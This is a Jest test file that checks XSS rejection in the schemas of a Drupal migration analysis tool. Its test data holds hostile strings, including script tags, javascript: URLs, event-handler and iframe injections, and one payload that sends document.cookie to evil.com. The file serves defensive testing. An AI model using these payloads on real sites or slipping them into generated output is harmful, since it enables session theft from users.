import { describe, it, expect } from '@jest/globals';
import {
  ContentArchitectureSchema,
  MigrationComplexitySchema,
  AccessibilityAuditSchema,
  PTEstimationSchema,
} from '../schemas';

describe('XSS Protection in Deep Analysis Schemas', () => {
  describe('ContentArchitectureSchema', () => {
    it('should reject malicious script tags in pageType', () => {
      const maliciousData = {
        pageTypes: [
          {
            type: '<script>alert("XSS")</script>',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(maliciousData)).toThrow(
        'String contains potentially malicious content'
      );
    });

    it('should reject javascript: URLs', () => {
      const maliciousData = {
        pageTypes: [
          {
            type: 'homepage',
            count: 10,
            sampleUrls: ['javascript:alert("XSS")'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(maliciousData)).toThrow();
    });

    it('should reject event handlers in strings', () => {
      const maliciousData = {
        pageTypes: [],
        contentTypeMapping: [
          {
            pageType: 'homepage',
            drupalContentType: 'page onclick=alert(1)',
            confidence: 90,
            reasoning: 'Standard page type',
          },
        ],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(maliciousData)).toThrow(
        'String contains potentially malicious content'
      );
    });

    it('should accept valid clean data', () => {
      const validData = {
        pageTypes: [
          {
            type: 'homepage',
            count: 10,
            sampleUrls: ['https://example.com/home'],
          },
        ],
        contentTypeMapping: [
          {
            pageType: 'homepage',
            drupalContentType: 'page',
            confidence: 95,
            reasoning: 'Standard homepage layout',
          },
        ],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(validData)).not.toThrow();
    });
  });

  describe('AccessibilityAuditSchema', () => {
    it('should reject XSS in violation descriptions', () => {
      const maliciousData = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'color-contrast',
            impact: 'serious' as const,
            count: 5,
            description: '<iframe src="evil.com"></iframe>',
            helpUrl: 'https://example.com/help',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(maliciousData)).toThrow(
        'String contains potentially malicious content'
      );
    });

    it('should reject malicious URLs in helpUrl', () => {
      const maliciousData = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'color-contrast',
            impact: 'serious' as const,
            count: 5,
            description: 'Low contrast detected',
            helpUrl: 'javascript:void(0)',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(maliciousData)).toThrow();
    });

    it('should accept valid accessibility audit data', () => {
      const validData = {
        wcagLevel: 'AA' as const,
        overallScore: 85,
        violations: [
          {
            id: 'color-contrast',
            impact: 'moderate' as const,
            count: 3,
            description: 'Some text elements have insufficient contrast',
            helpUrl: 'https://dequeuniversity.com/rules/axe/4.4/color-contrast',
          },
        ],
        pagesAudited: 15,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(validData)).not.toThrow();
    });
  });

  describe('PTEstimationSchema', () => {
    it('should reject XSS in assumptions', () => {
      const maliciousData = {
        totalHours: 500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: [
          'Using adessoCMS baseline',
          '<script>alert("XSS")</script>',
        ],
      };

      expect(() => PTEstimationSchema.parse(maliciousData)).toThrow(
        'String contains potentially malicious content'
      );
    });

    it('should reject negative hours', () => {
      const invalidData = {
        totalHours: -500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: ['Using adessoCMS baseline'],
      };

      expect(() => PTEstimationSchema.parse(invalidData)).toThrow();
    });

    it('should accept valid PT estimation data', () => {
      const validData = {
        totalHours: 500,
        confidence: 85,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: [
          'Using adessoCMS baseline project',
          'Team has Drupal experience',
          'Standard 2-week sprints',
        ],
      };

      expect(() => PTEstimationSchema.parse(validData)).not.toThrow();
    });
  });

  describe('Attack Scenario Tests', () => {
    it('should prevent stored XSS attack via manipulated AI output', () => {
      // Simulating an attacker manipulating AI to inject malicious content
      const attackPayload = {
        pageTypes: [
          {
            type: 'product<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
            count: 50,
            sampleUrls: ['https://example.com/products'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 10,
        totalPages: 200,
      };

      expect(() => ContentArchitectureSchema.parse(attackPayload)).toThrow();
    });

    it('should prevent DOM-based XSS via event handlers', () => {
      const attackPayload = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'test" onload="alert(1)',
            impact: 'serious' as const,
            count: 5,
            description: 'Test violation',
            helpUrl: 'https://example.com/help',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(attackPayload)).toThrow();
    });

    it('should prevent iframe injection', () => {
      const attackPayload = {
        totalHours: 500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: [
          'Standard migration <iframe src="https://evil.com"></iframe>',
        ],
      };

      expect(() => PTEstimationSchema.parse(attackPayload)).toThrow();
    });
  });
});
